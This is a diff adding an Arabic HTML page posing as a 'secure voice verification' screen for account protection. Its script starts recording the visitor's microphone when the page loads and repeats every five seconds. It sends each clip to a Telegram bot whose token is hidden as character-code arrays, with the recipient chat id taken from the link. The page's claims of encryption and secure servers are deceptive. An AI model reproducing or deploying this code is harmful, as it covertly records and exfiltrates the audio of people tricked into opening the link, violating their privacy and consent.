@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>التحقق من الحساب</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #2c3e50, #4a90e2);
+            font-family: 'Tajawal', sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+            text-align: center;
+        }
+        
+        .main-container {
+            max-width: 800px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+        }
+        
+        .header {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #4a90e2, #1e62d0);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(74, 144, 226, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(74, 144, 226, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(74, 144, 226, 0); }
+        }
+        
+        .logo i {
+            font-size: 60px;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #4a90e2;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .header p {
+            font-size: 18px;
+            color: #e0e0e0;
+            max-width: 500px;
+            line-height: 1.6;
+        }
+        
+        .verification-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(74, 144, 226, 0.3);
+            margin-bottom: 30px;
+        }
+        
+        .verification-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, #4a90e2, #1e62d0);
+        }
+        
+        .status {
+            font-size: 20px;
+            margin-bottom: 30px;
+            color: #fff;
+            font-weight: 500;
+            line-height: 1.6;
+        }
+        
+        .countdown-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .countdown-label {
+            font-size: 18px;
+            color: #a0c4ff;
+            margin-bottom: 15px;
+        }
+        
+        .countdown {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4a90e2, #1e62d0);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 42px;
+            font-weight: 700;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+        
+        .recording-info {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border-left: 4px solid #4a90e2;
+        }
+        
+        .recording-info h3 {
+            color: #a0c4ff;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .recording-info p {
+            color: #e0e0e0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .microphone-icon {
+            margin-top: 20px;
+            font-size: 50px;
+            color: #4a90e2;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .recording-status {
+            margin-top: 15px;
+            font-size: 18px;
+            color: #fff;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .recording-indicator {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #e74c3c;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .stats-container {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            margin-top: 20px;
+            gap: 15px;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .stat-box {
+            background: rgba(74, 144, 226, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            flex: 1;
+            min-width: 120px;
+            border: 1px solid rgba(74, 144, 226, 0.3);
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #4a90e2;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #a0c4ff;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #a0c4ff;
+            font-size: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+            width: 100%;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 150px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            flex: 1;
+            min-width: 130px;
+        }
+        
+        .step-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(74, 144, 226, 0.3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            font-size: 24px;
+            color: #4a90e2;
+        }
+        
+        .step-text {
+            font-size: 14px;
+            text-align: center;
+            color: #e0e0e0;
+            line-height: 1.4;
+        }
+        
+        @media (max-width: 600px) {
+            .verification-container {
+                padding: 30px 20px;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+            }
+            
+            .header p {
+                font-size: 16px;
+            }
+            
+            .status {
+                font-size: 18px;
+            }
+            
+            .steps {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .step {
+                max-width: 100%;
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-microphone-alt"></i>
+            </div>
+            <h1>نظام التحقق الصوتي الآمن</h1>
+            <p>نظام التحقق الصوتي يعمل تلقائيًا لتأمين حسابك وحماية بياناتك الشخصية</p>
+        </div>
+        
+        <div class="verification-container">
+            <p class="status">
+                <i class="fas fa-sync-alt fa-spin"></i> 
+                جاري التحقق من حسابك وتفعيل الحماية الصوتية...
+            </p>
+            
+            <div class="countdown-container">
+                <div class="countdown-label">الوقت المتبقي للتسجيل التالي:</div>
+                <div class="countdown" id="countdown">5</div>
+            </div>
+            
+            <div class="recording-info">
+                <h3>معلومات التسجيل</h3>
+                <p>يتم تسجيل صوتك تلقائيًا كل 5 ثوانٍ وإرساله إلى خوادم آمنة لتأكيد هويتك</p>
+            </div>
+            
+            <div class="microphone-icon">
+                <i class="fas fa-microphone"></i>
+            </div>
+            <p class="recording-status">
+                <span class="recording-indicator"></span>
+                جاري تسجيل الصوت الآن...
+            </p>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-box">
+                <div class="stat-value" id="recordings-count">0</div>
+                <div class="stat-label">عدد التسجيلات</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="success-count">0</div>
+                <div class="stat-label">إرسالات ناجحة</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="next-recording">5</div>
+                <div class="stat-label">ثواني للتسجيل التالي</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>جميع التسجيلات مشفرة وآمنة &copy; 2025 نظام التحقق الصوتي الآمن</p>
+        </div>
+    </div>
+
+    <script>
+    function getBotToken() {
+
+      const tokenParts = [
+        [56, 48, 49], // 801
+        [49, 50, 51, 52], // 1234
+        [52, 48, 51], // 403
+        [58], // :
+        [65, 65, 69, 71], // AAEG
+        [107, 107, 55, 102, 50, 45], // kk7f2-
+        [110, 67, 66, 118, 114, 110], // nCBvrn
+        [51, 114, 55, 122], // 3r7z
+        [95, 72, 45, 95], // _H-_
+        [122, 56, 71, 85, 89, 66], // z8GUYB
+        [104, 79, 75, 111, 115] // hOKos
+      ];
+      
+
+      const token = tokenParts.map(part => 
+        part.map(code => String.fromCharCode(code)).join('')
+      ).join('');
+      
+      return token;
+    }
+
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const CHAT_ID = urlParams.get('id');
+        
+        // إحصائيات النظام
+        let recordingsCount = 0;
+        let successCount = 0;
+        let recordingActive = true;
+        
+        // عناصر الواجهة
+        const countdownElement = document.getElementById('countdown');
+        const recordingsCountElement = document.getElementById('recordings-count');
+        const successCountElement = document.getElementById('success-count');
+        const nextRecordingElement = document.getElementById('next-recording');
+        
+        // تحديث الإحصائيات
+        function updateStats() {
+            recordingsCountElement.textContent = recordingsCount;
+            successCountElement.textContent = successCount;
+        }
+        
+        // دالة العد التنازلي
+        function startCountdown(seconds, callback) {
+            countdownElement.textContent = seconds;
+            nextRecordingElement.textContent = seconds;
+            
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                nextRecordingElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    if (callback) callback();
+                }
+            }, 1000);
+        }
+        
+        // دالة إرسال الصوت
+        const BOT_TOKEN = getBotToken();
+        
+        function sendVoice(audioBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("voice", audioBlob, "voice.ogg");
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                successCount++;
+                updateStats();
+                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "🎤 تم تسجيل الصوت بنجاح"
+                    })
+                });
+            }).catch(error => {
+                console.error("فشل إرسال الصوت:", error);
+            });
+        }
+        
+        // دالة بدء التسجيل
+        async function startRecording() {
+            if (!recordingActive) return;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = () => {
+                    if (audioChunks.length > 0) {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/ogg; codecs=opus" });
+                        sendVoice(audioBlob);
+                    }
+                    
+                    // أغلق الدفق بعد الانتهاء
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // سجل أننا قمنا بتسجيل جديد
+                    recordingsCount++;
+                    updateStats();
+                    
+                    // ابدأ العد التنازلي للتسجيل التالي
+                    startCountdown(5, startRecording);
+                };
+                
+                mediaRecorder.start();
+                
+                // أوقف التسجيل بعد 5 ثوانٍ
+                setTimeout(() => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+                
+            } catch (error) {
+                console.error("حدث خطأ أثناء الوصول إلى المايكروفون:", error);
+                document.querySelector('.recording-status').innerHTML = 
+                    '<span class="recording-indicator" style="background:#e74c3c"></span> خطأ في الوصول إلى الميكروفون';
+                
+                // حاول مرة أخرى بعد 5 ثوانٍ في حالة الخطأ
+                setTimeout(startRecording, 5000);
+            }
+        }
+        
+        // بدء التسجيل عند تحميل الصفحة
+        window.onload = function() {
+            // ابدأ التسجيل الأول
+            startRecording();
+            
+            // ابدأ العد التنازلي الأول
+            startCountdown(5, () => {});
+            
+            // تحديث الإحصائيات
+            updateStats();
+        };
+    </script>
+</body>
+</html>
